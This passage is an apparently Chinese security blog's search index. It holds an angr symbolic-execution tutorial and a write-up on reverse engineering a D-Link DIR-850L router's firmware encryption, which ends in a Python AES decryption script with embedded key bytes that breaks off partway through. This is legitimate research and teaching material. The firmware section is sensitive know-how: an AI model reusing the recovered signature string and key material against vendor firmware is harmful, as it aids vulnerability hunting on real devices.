<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Angr Learning Note</title>
    <url>/2023/10/20/Angr%20Learning%20Note/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
迈向自动化的第二步——
</blockquote>
<span id="more"></span>
<h1 id="xff-reference">0xFF Reference</h1>
<p><a href="https://heygap.github.io/2023/09/30/blog9/#more">1. Symbolic
Execution Leaning Note (1) -- Basis</a><br />
<a href="https://xz.aliyun.com/t/7117#toc-22">2.
2020年Angr-Api非官方介绍</a><br />
<a
href="https://github.com/jakespringer/angr_ctf/blob/master/SymbolicExecution.pptx">3.
angr_ctf里介绍angr的ppt(讲的真的挺好的)</a></p>
<h1 id="x00-recall-symbolic-execution">0x00 Recall-Symbolic
Execution</h1>
<p>笔者水平有限，如有错误请指出 ;-)</p>
<p>我们先回顾一下什么是符号执行：<br />
我们在逆向一个程序、去找一个程序的漏洞时，我们会希望找到一个<code>input</code>,来触发我们需要的漏洞或者找到我们需要的flag，而符号执行的功能就是<strong>通过遍历程序所有可能的“状态(State)”，找到我们需要的State，进而通过约束求解器，求解出我们最后需要的input</strong></p>
<p>宏观上看，符号执行可以分为<code>三步</code><br />
1. 注入符号 2. 分支 3. 执行分支</p>
<p>我们用一个简单的函数来分别看一下这三步是什么 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// demo func</span><br><span class="line"></span><br><span class="line">Line1  void check_func(char* passwd)</span><br><span class="line">Line2  &#123;</span><br><span class="line">Line3      if(passwd == &quot;HeyGap&quot;)</span><br><span class="line">Line4          printf(&quot;Access granted&quot;);</span><br><span class="line">Line5      else</span><br><span class="line">Line6          printf(&quot;Access denied&quot;);</span><br><span class="line">Line7  &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="注入符号inject-symbols">1. 注入符号(Inject Symbols)</h3>
<ul>
<li>什么是注入符号？<br />
我们在<code>具体执行</code>的时候，传入的passwd是一个具体的字符串；可我们在<code>符号执行</code>时，传入的是一个<code>符号</code>。</li>
<li>什么是符号？
类比于我们小学学的方程<code>x + 1 = 2</code>，我们可以通过这样一个方程来求解出变量x，我们也称“这个方程约束了这个变量x”；而<code>符号</code>就是方程中的<code>变量</code>，用来约束符号的<code>执行路径</code>就可以类比成<code>方程</code></li>
<li>什么是执行路径？<br />
从State_A到State_B的<code>执行路径</code>就是<strong>从起点A可以执行到终点B的一条指令(instructions)路径</strong>,在每条执行路径中都会维护一个符号变量<code>pc</code>，pc记录了“从A点出发，要到达B的全部条件”，这个符号变量的类型是逻辑表达式，我们可以将这个符号变量扔到SMT求解器（比如z3）中去求解满足这个符号变量中所有约束条件的1~n个解</li>
<li>Example<br />
在上述例子中，我们将一个符号传入passwd中，就是注入符号。</li>
</ul>
<h3 id="分支branching">2. 分支(Branching)</h3>
<ul>
<li>什么是branching<br />
由于我们的符号是一个待确定的值，所以我们在遇到<code>判断语句</code>时，当前的State会设置为执行完毕(already
executed)，然后激活(active)两个新的state，由于要遍历全部state，符号在判断语句中得到不同返回值，而这两个state就是不同返回值进入的不同分支的起始状态</li>
<li>Example
在上述例子中，可以理解为Line1-2为state1，当执行到Line3时，state1设置为执行完毕，同时激活state2和state3，state2为Line4，state3为Line6</li>
</ul>
<h3 id="评估分支evaluate-each-branches">3. 评估分支(Evaluate Each
Branches)</h3>
<ul>
<li>什么是Evaluate Branches？<br />
我们会评估(Evaluate)每一个active的state，判断他们是否符合我们的需求，如果不满足就设置terminated，如果遇到判断语句就进入第二步</li>
<li>Example
假设当前激活的state为2和3，如果我们需要“标准输出中包含'granted'”，那符号执行器就会评估state2，发现这个state符合我们的要求，于是将state2加到found数组中；然后再评估state3，发现不符合，设置为terminated</li>
</ul>
<h1 id="x01-an-introduction-to-angr">0x01 An Introduction to Angr</h1>
<h3 id="出现的class">1. 出现的class</h3>
<p>笔者在此记录相对重要的class，读者可以通过阅读源码或官方手册等方式，先弄清楚这些class的作用
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SimState</span><br><span class="line">Simulation Manager(simgr)</span><br></pre></td></tr></table></figure></p>
<h3 id="symbolic-execution-in-angr">2. Symbolic Execution In Angr</h3>
<p>通过0x00，我们知道在符号执行中，<code>执行路径</code>和<code>符号</code>是最重要的两个东西
- Angr中的执行路径<br />
1.
我们知道每branch一次，就会添加两个state，而在Angr中，维护路径信息的pc由<code>SimState</code>
Object组成，SimState用∩链在一起就组成了pc 2.
由于我们要遍历全部state，所以我们需要有一个管理器来管理全部执行路径(a
Set of
Path)，这个管理器就是<code>Simulation Manager (simgr)</code>,下图为Angr中生成全部路径的过程
<img src="/pic/1.png" /> 3.
上图提到<code>until we find what we want</code>，simgr提供了函数<code>explore</code>，可以让我们通过两种方式来找到我们需要的state<br />
1. 通过指令在text段的地址 2. 通过任意体现state特征的函数</p>
<ul>
<li>State Explosion
<ol type="1">
<li>但是单纯的遍历每一条路径会存在状态爆炸(State
Explosion，有些地方也叫路径爆炸)的问题，来看下面这个循环
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x；</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(x &gt; <span class="number">10</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Good&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>当i=1时，管理器会创建两个state，而i=2时，先前的两个state有分别会创建两个state，当i=100时，我们就会出现2^100个state，这就是状态爆炸问题</li>
<li>而explore也为我们提供了一个参数avoid，效果就是<code>剪枝</code>，在explore中添加avoid参数会帮助我们提前terminate那些我们不需要的state，因此这个state后续的branch就不会再跟进</li>
</ol></li>
</ul>
<h1 id="x01-库架构分析">0x01 库架构分析</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">angr</span><br><span class="line"> | - Project()</span><br><span class="line">		 | - factory</span><br><span class="line">				 | - state</span><br><span class="line">					   | - entry_state()</span><br><span class="line">					   | - blank_state(addr)</span><br><span class="line"></span><br><span class="line">					   | - regs.eax/ebx/...</span><br><span class="line">					   | - solver</span><br><span class="line">							  | - BVS</span><br><span class="line">							  | - eval</span><br><span class="line">					   | - fs</span><br><span class="line">						    | - insert(string filename,angr.storage.SimFile())</span><br><span class="line">				 | - simulation_manager(init_state)</span><br><span class="line">						 | - explore(find,avoid)</span><br><span class="line">						 | - found[]</span><br><span class="line"></span><br><span class="line"> | - storage</span><br><span class="line">		 | - SimFile(filename,content,size)</span><br><span class="line"> | - sim_options</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_MEMORY</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_REGISTERS</span><br><span class="line"></span><br><span class="line">found_state</span><br><span class="line">	 | - posix</span><br><span class="line">		   | - dumps(std)</span><br><span class="line">	 | - solver</span><br><span class="line">		   | - eval(claripy.BVS pass,cast_to)</span><br></pre></td></tr></table></figure>
<h1 id="x02-api手册">0x02 API手册</h1>
<ul>
<li><strong>Project类(参数、功能、重载、返回值)</strong>
<ol type="1">
<li>构造函数参数：“命令行中运行程序的指令”(eg: "./00_angr_find")</li>
<li>功能：“构建一个符号执行项目”</li>
<li>附属成员
<ul>
<li><strong>factory</strong>
<ol type="1">
<li>附属成员
<ul>
<li><strong>state</strong>
<ol type="1">
<li>重载函数
<ul>
<li><strong>entry_state()</strong>
<ol type="1">
<li>返回值：程序入口点</li>
</ol></li>
<li><strong>blank_state(addr)</strong>
<ol type="1">
<li>参数：模拟执行开始的地址</li>
</ol></li>
</ul></li>
<li>附属成员
<ul>
<li><strong>regs</strong>
<ol type="1">
<li>附属成员: 各种寄存器</li>
</ol></li>
<li><strong>fs</strong>
<ol type="1">
<li>全称: filesystem</li>
<li>附属成员：
<ul>
<li><strong>insert(string filename,angr.storage.simFile)</strong>
<ol type="1">
<li>参数1：文件名称</li>
<li>参数2：创建过的符号化文件对象</li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
<li><strong>simulation_manager类</strong>
<ol type="1">
<li>构造函数参数：起始状态</li>
<li>功能：设置模拟执行的起始地址，并返回实例化对象</li>
<li>附属成员
<ul>
<li><strong>explore(find, avoid)</strong>
<ol type="1">
<li>参数find：希望程序抵达的地址</li>
<li>参数avoid：希望程序不抵达的地址</li>
<li>功能：用符号探索到find指向的地址，并避免avoid指向的地址</li>
<li>重载：explore(find=func1,avoid=func2) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func1(state):</span><br><span class="line">	return b&quot;Good Job!&quot; in state.posix.dumps(1)</span><br><span class="line">def func2(state):</span><br><span class="line">	return b&quot;Try Again!&quot; in state.posix.dumps(1)</span><br></pre></td></tr></table></figure>
<ol type="1">
<li>功能：探索具有func1特征的的函数分支，回避具有func2特征的函数分支</li>
</ol></li>
</ol></li>
<li><strong>found数组</strong>
<ol type="1">
<li>found_state的实例化数组</li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
<li><strong>found_state类</strong>
<ul>
<li><strong>posix</strong>
<ul>
<li><strong>dumps(int std)</strong>
<ol type="1">
<li>参数std: stdin(0)/stdout(1)/stderr(2)</li>
<li>功能: 将std指向的内容打印出来</li>
</ol></li>
</ul></li>
<li>solver
<ul>
<li>eval(claripy.BVS arg1)
<ol type="1">
<li>参数：要求解的约束公式</li>
<li>功能：求解arg1并返回结果</li>
</ol></li>
</ul></li>
</ul></li>
<li><strong>claripy类</strong>
<ul>
<li><strong>BVS类</strong>
<ol type="1">
<li>构造函数参数：arg1: 别名 | arg2: 符号向量占多少位</li>
<li>功能：构建一个空的约束公示</li>
</ol></li>
</ul></li>
<li><strong>storage类</strong>
<ul>
<li>SimFile(filename,content,size)
<ol type="1">
<li>参数filename：要引入的filename</li>
<li>参数content：符号化向量</li>
<li>参数size：要从文件中读取的字节数*8（单位：bits）</li>
<li>功能：创建一个符号化的文件对象</li>
</ol></li>
</ul></li>
<li><strong>sim_options类</strong>
<ul>
<li>SYMBOL_FILL_UNCONSTRAINED_MEMORY
<ul>
<li>功能：自动用符号填充未约束的内存（模拟过程中没有明确值的内存位置）</li>
</ul></li>
<li>SYMBOL_FILL_UNCONSTRAINED_REGISTERS
<ul>
<li>功能：自动用符号填充未约束的寄存器</li>
</ul></li>
</ul></li>
</ul>
<h1 id="x01-angr语法">0x01 Angr语法</h1>
<h3 id="准备阶段">1. 准备阶段</h3>
<ul>
<li><p><strong>引入与初始化</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(exec_path)</span><br><span class="line"></span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"><span class="comment"># init_state = p.factory.blank_state(addr) # addr = 0xbeef</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>命令行引入参数</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">	arg1 = argv[<span class="number">1</span>]</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main(sys.argv)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>符号向量</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">pass1 = claripy.BVS(<span class="string">&#x27;pass1&#x27;</span>, <span class="number">32</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>符号化寄存器</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init_state.regs.eax = pass1</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>符号化文件</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename = <span class="string">&quot;&quot;</span></span><br><span class="line">filesize = </span><br><span class="line"></span><br><span class="line">password = init_state.solver.BVS(<span class="string">&#x27;password&#x27;</span>,filesize*<span class="number">8</span>)</span><br><span class="line">sim_file = angr.storage.SimFile(filename,content=password,size=filesize)</span><br><span class="line"></span><br><span class="line">init_state.fs.insert(sim_file)</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h3 id="探索阶段">2. 探索阶段</h3>
<ul>
<li><p><strong>探索指定地址并查看标准流</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sm.explore(find = addr_to_find)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>利用函数explore分支</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="string">b&quot;Good Job!&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="string">b&quot;Try Again!&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good, avoid=is_bad)</span><br><span class="line"><span class="comment"># sm.explore(find=addr_find, avoid=addr_avoid)</span></span><br></pre></td></tr></table></figure></p></li>
</ul>
<h3 id="输出阶段">3. 输出阶段</h3>
<ul>
<li><p><strong>查看结果</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">	found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;[x] Solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(found_state.posix.dumps(<span class="number">0</span>)))</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>求解寄存器的符号向量</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = init_state.solver.<span class="built_in">eval</span>(BVS)</span><br></pre></td></tr></table></figure></p></li>
</ul>
]]></content>
      <categories>
        <category>Software analysis technology</category>
      </categories>
      <tags>
        <tag>SymbolicExecution</tag>
      </tags>
  </entry>
  <entry>
    <title>IOT - 某路由器mips固件解密脚本复现</title>
    <url>/2023/11/09/IOT%20-%20%20%E6%9F%90%E8%B7%AF%E7%94%B1%E5%99%A8mips%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
期中终于结束了😭复现一下b站Wker666的固件解密
</blockquote>
<span id="more"></span>
<blockquote>
<p>第一次分析IOT固件，不当之处请指出😭</p>
</blockquote>
<h1 id="xff-前置知识">0xFF 前置知识</h1>
<ol type="1">
<li><p>多数情况下，路由器固件解包以后我们会拿到一个类似于 Linux
文件系统的文件夹，这个文件系统会跑一些三环程序，而三环程序有非常多的系统调用，因此我们希望通过这些三环程序来提权。</p></li>
<li><p>现在很多厂商会认为，自己的路由器能被解包太不安全了，因此他们会通过加密，但是每次更新换代时，后一代的固件包都是通过前一代的固件中的某个解密算法来解密的。因此，我们在挖掘
IOT
漏洞时，会先找到比较老的一些版本，分析解密算法，进而自己写出解密脚本来解密新一代的固件包。</p></li>
<li><p>(建议看到0x01后再来阅读本条)我们在路由器的 web user
上发送一个更新请求的时候，客户端会先发给服务器一个 http
请求，然后被服务器的 httpd 二进制文件接收，httpd 会 fork
一个新的进程来启用二进制文件 cgibin ，并把环境变量和 http 的请求发给 cgi
， cgi
完成处理以后，把内容输出到标准输出流之类的东西，并返回客户</p></li>
<li><p>IDA 反编译 Mips
文件会有很多“无用操作”，就是两个变量来回赋值之类的，这是由于 Mips
有分支延迟的特性</p></li>
</ol>
<h1 id="x00-准备工作">0x00 准备工作</h1>
<p><img src="https://i0.imgs.ovh/2023/11/09/lto8e.png"
alt="lto8e.png" />
上图中间有这样一句话<code>Upgrade to Firmware V2.10 and then instantly go back into the web user interface and upgrade to Firmware V2.20</code></p>
<p>它告诉我们，从web
user更新到2.2版本时，需要先从官网下载2.1的固件并更新到2.1才行</p>
<p>也就是说，2.2大概率是一个加密固件包，我们无法通过<code>binwalk</code>直接解包，但是2.1可以</p>
<p>我们download两个包到本地binwalk解包一下看看</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/ltiAU.png" alt="ltiAU.png" />
<figcaption aria-hidden="true">ltiAU.png</figcaption>
</figure>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/ltjx0.png" alt="ltjx0.png" />
<figcaption aria-hidden="true">ltjx0.png</figcaption>
</figure>
<p>我们可以看到，确实像我们猜想的那样，V2.1未加密，V2.2加密</p>
<h1 id="x01-定位解密逻辑">0x01 定位解密逻辑</h1>
<p>通过 <strong>0xFF.3</strong>
我们知道要分析cgibin和httpd文件，所以我们用IDA打开看一下
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cgibin : /_DIR850LB1_FW210WWb03.bin.extracted/squashfs-root/htdocs</span><br><span class="line"></span><br><span class="line">httpd : /_DIR850LB1_FW210WWb03.bin.extracted/squashfs-root/sbin</span><br></pre></td></tr></table></figure></p>
<p>我们先来分析一下在本文中不那么重要的 httpd 文件，IDA7.6
以上的版本是可以反编译 Mips 的 <img
src="https://i0.imgs.ovh/2023/11/09/l12OW.png" alt="l12OW.png" /> 我们在
function 中搜索
cgi，找到<code>process_cgi</code>函数，如上图，可以看到里面有很多环境变量如<code>GATEWAY_INTERFACE</code>和<code>CONTENT_LENGTH</code>等，在设置完环境变量后，我们可以看到它调用了<code>spawn</code>函数，我们跟进去看一下
<img src="https://i0.imgs.ovh/2023/11/09/l1ZZe.png"
alt="l1ZZe.png" /></p>
<p><img src="https://i0.imgs.ovh/2023/11/09/l1lK3.png"
alt="l1lK3.png" /> 可以看到，在 <strong>Line20</strong>
的位置，该进程是被fork起来的，而在 <strong>Line46</strong>
的位置，我们执行了 <code>execve</code> 系统调用，而我们知道 execve
的第一个参数是文件路径，第二个参数是argv，第三个参数是环境变量，因此我们回溯一下</p>
<p>而在调用 <code>spawn</code> 的图中，我们可以看到，spawn
的第一个参数是<code>*v77,v77,ptr</code>,这里的 v77 就是 file_path，而
ptr 就是 env_ptr，我们接着溯源(溯源的时候我们会发现 file_path
的调用处非常少，这是因为 ida 的反编译并没有将 file_path
的数据类型正确处理，导致 file_path 下面的一些变量，其实可能就是
file_path，但因为处理错了，所以被命名为 v78 v79 ...)</p>
<p>如下图，我们挨个分析，而当我们看到 v80 时，可以看到对 v80
被做了手脚，Wker666 说这里是对 cgi 进行一些选择，但我 STFW
以后也没找到原因，先搁置一下吧</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1tB2.png" alt="l1tB2.png" />
<figcaption aria-hidden="true">l1tB2.png</figcaption>
</figure>
<p>至此，httpd
就分析完了，httpd主要是做前端用的，它本身也有一些漏洞，不过这里就不再分析了，我们直接看cgibin</p>
<hr />
<p>我们用 IDA 打开 cgibin 文件，往下找到 seamacgi_main (这里没找到 seama
到底是什么意思，只是因为在 function 中搜索 enc 可以找到 encrypt_main
，溯源分析就能找到 semacgi_main 了) <img
src="https://i0.imgs.ovh/2023/11/09/l111j.png" alt="l111j.png" /></p>
<p>跟进 semacgi_main ,可以找到 encrypt_main
函数，这就是我们需要的解密函数了</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1UfV.png" alt="l1UfV.png" />
<figcaption aria-hidden="true">l1UfV.png</figcaption>
</figure>
<h1 id="x02-解密逻辑分析">0x02 解密逻辑分析</h1>
<h3 id="被传入的参数">被传入的参数</h3>
<p>我们查看 encrypt_main 函数的引用，可以在 sub_407664+668
处找到一处调用，我们可以看到第一个参数是6，第二个参数被赋值了很多类似于-i，-d之类的东西，结合
encrypt_main 函数是个 main，我们猜测第一个参数是
argc，第二个参数是argv</p>
<p>但是这里的赋值方式很奇怪，v116
是<code>struct stat</code>，是一个结构体，我们再去别的引用处看一下，可以在
encode_file_check 函数中发现这些参数其实是一个 char 数组，这就符合我们对
argv 的认知了。</p>
<p>我们按 y 键将 sub_407664 中的 v116 的数据类型修改成 char* 即可</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1iQJ.png" alt="l1iQJ.png" />
<figcaption aria-hidden="true">l1iQJ.png</figcaption>
</figure>
<p>接下来分析 argv 都是些什么东西<br />
- 第一个参数: encimg - 第二个参数: -i (将 v116
数据类型修改后，可以很明显的看到"-i"是 v117，而全局变量 ptr 才是 v118) -
第三个参数: ptr(在 encode_file_check 函数中我们可以看到，ptr 与
"/var/firmware.seama"
作了比较，因此我们猜测ptr可能是指向文件名字符串的指针) - 第四个参数: -s
- 第五个参数: byte_43CDB0(在 encode_file_check
函数中我们可以看到，byte_43CDB0 是从 <code>/etc/config/image_sign</code>
文件读出了128个字符，我们去看一下这个文件，发现里面是<code>wrgac25_dlink.2013gui_dir850l</code>)
- 第六个参数: -d</p>
<p>因此，我们传入的参数是<code>encimg -i file -s wrgac25_dlink.2013gui_dir850l -d</code></p>
<p>这也符合 argc = 6 的要求</p>
<h3 id="参数功能">参数功能</h3>
<p>我们知道，一般来说 -h 代表的是 help，所以我们查看一下 encrypt_main
函数的<code>case h:</code>会打印什么东西</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_408F8C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &#123;OPTIONS&#125;\n&quot;</span>, <span class="string">&quot;encimg&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -h                      : show this message.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -v                      : Verbose mode.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -i &#123;input image file&#125;   : input image file.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -e                      : encode file.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -d                      : decode file.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;   -s                      : signature.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而经过 switch-case 后，在 Line57 判断 dword_43CE40 也就是 signature
是否存在，这个是 -s 参数做的事情，而在 Line59 处判断 file
是否存在，如果两个都通过，就会调用 sub_4090E0 函数，我们继续跟进</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1qvD.png" alt="l1qvD.png" />
<figcaption aria-hidden="true">l1qvD.png</figcaption>
</figure>
<p>在 sub_4090E0
函数的前一部分中，做了文件校验等不是很重要的操作，而重要的解密操作从
<strong>Line108</strong> 开始，也就是下图位置，我已经加好注释了</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJCoX.png" alt="lJCoX.png" />
<figcaption aria-hidden="true">lJCoX.png</figcaption>
</figure>
<p>Line130-Line137 是设置AES加解密密钥<code>user_key</code>，而
Line108-Line129
是用<code>_____progs_board_fw_sign_data</code>初始化<code>user_key</code>，接着用
encrypt 函数对<code>user_key</code>做一些处理，我们跟进一下 encrypt
函数</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJP5U.png" alt="lJP5U.png" />
<figcaption aria-hidden="true">lJP5U.png</figcaption>
</figure>
<p>而设置好密钥以后，Line158 处调用 AES_cbc_encrypt
函数(如下图)，但我们通过<a
href="https://blog.csdn.net/duanxingheng/article/details/11730617">OpenSSL-AES</a>这篇文章知道，AES
不可能只有这么点参数，并且根据分析， v32 和 mmap_file_ptr 都是 mmap_file
，这肯定不对。</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJLr0.png" alt="lJLr0.png" />
<figcaption aria-hidden="true">lJLr0.png</figcaption>
</figure>
<p>所以我们按 y
键，将<code>AES_cbc_encrypt</code>修改为<code>void AES_cbc_encrypt(const unsigned char *in, unsigned char *out,   size_t length, const AES_KEY *key,    unsigned char *ivec, const int enc);</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">in</span>： 需要加密/解密的数据；</span><br><span class="line"></span><br><span class="line">out： 计算后输出的数据；</span><br><span class="line"></span><br><span class="line">length： 数据长度（这里不包含初始向量数据长度）</span><br><span class="line"></span><br><span class="line">key：密钥</span><br><span class="line"></span><br><span class="line">ivec： 初始向量（一般为<span class="number">16</span>字节全<span class="number">0</span>）</span><br><span class="line"></span><br><span class="line">enc： <span class="title function_">AES_ENCRYPT</span>(<span class="number">1</span>) 代表加密， <span class="title function_">AES_DECRYPT</span>(<span class="number">0</span>) 代表解密；</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJXIC.png" alt="lJXIC.png" />
<figcaption aria-hidden="true">lJXIC.png</figcaption>
</figure>
<p>现在我们可以看出，Line131-Line177 就是很标准的一个 AES 加解密</p>
<h1 id="解密脚本">解密脚本</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt_file</span>(<span class="params">key,iv,input_file,output_file</span>):</span><br><span class="line">    cipher = AES.new(<span class="built_in">bytes</span>(key),AES.MODE_CBC,<span class="built_in">bytes</span>(iv))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile, <span class="built_in">open</span>(output_file,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = infile.read(<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(chunk) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(chunk) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;aes error&quot;</span>)</span><br><span class="line">            decrypted_chunk = cipher.decrypt(chunk)</span><br><span class="line">            outfile.write(decrypted_chunk)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">______progs_board_fw_sign_data =[<span class="number">0x6B</span>, <span class="number">0x35</span>, <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x31</span>, <span class="number">0x2B</span>, <span class="number">0x62</span>, <span class="number">0x76</span>, <span class="number">0x57</span>, <span class="number">0x45</span>, </span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0x5A</span>, <span class="number">0x36</span>, <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x74</span>, <span class="number">0x70</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0x79</span>, <span class="number">0x6E</span>, <span class="number">0x4F</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x63</span>, <span class="number">0x69</span>, <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0x5A</span>, <span class="number">0x71</span>, <span class="number">0x51</span>, <span class="number">0x65</span>, <span class="number">0x68</span>, <span class="number">0x48</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x6D</span>, </span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x35</span>, <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0x2B</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, </span><br><span class="line">  <span class="number">0x62</span>, <span class="number">0x6E</span>, <span class="number">0x38</span>, <span class="number">0x62</span>, <span class="number">0x4E</span>, <span class="number">0x48</span>, <span class="number">0x5A</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x6A</span>, </span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0x70</span>, <span class="number">0x36</span>, <span class="number">0x57</span>, <span class="number">0x43</span>, <span class="number">0x6C</span>, <span class="number">0x39</span>, <span class="number">0x79</span>, <span class="number">0x6E</span>, <span class="number">0x39</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x49</span>, <span class="number">0x6B</span>, <span class="number">0x69</span>, <span class="number">0x49</span>, <span class="number">0x31</span>, <span class="number">0x0A</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, </span><br><span class="line">  <span class="number">0x75</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x54</span>, <span class="number">0x45</span>, <span class="number">0x45</span>, <span class="number">0x50</span>, <span class="number">0x6F</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, </span><br><span class="line">  <span class="number">0x4A</span>, <span class="number">0x42</span>, <span class="number">0x46</span>, <span class="number">0x76</span>, <span class="number">0x39</span>, <span class="number">0x42</span>, <span class="number">0x4D</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x2B</span>, 